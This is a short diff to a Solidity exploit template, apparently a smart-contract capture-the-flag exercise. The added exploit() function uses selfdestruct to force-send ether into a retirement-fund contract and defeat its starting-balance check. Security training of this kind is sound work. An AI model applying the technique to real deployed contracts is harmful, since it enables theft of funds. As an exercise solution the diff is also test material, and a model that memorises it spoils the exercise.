@@ -58,4 +58,10 @@ contract ExploitContract {
     }
 
     // write your exploit functions below
+    /// @dev we can force send ether to the contract to circumvent the startBalance
+    /// requirement. Selfdestruct can force send ether to any address without the need
+    /// for a receive function.
+    function exploit() public payable {
+        selfdestruct(payable(address(retirementFund)));
+    }
 }
